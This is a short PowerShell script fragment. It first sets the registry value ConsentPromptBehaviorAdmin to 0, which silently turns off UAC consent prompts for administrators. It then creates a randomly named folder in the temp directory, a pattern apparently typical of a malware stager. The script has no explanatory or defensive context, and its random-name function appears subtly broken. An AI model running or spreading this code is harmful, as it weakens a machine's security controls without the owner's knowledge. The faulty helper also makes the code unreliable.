
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0

function generateRandomText {
    return -join (65..90) + (97..122) | Get-Random -Count 5 | % { [char]$_ }
}

cd $env:TEMP
mkdir $(generateRandomText)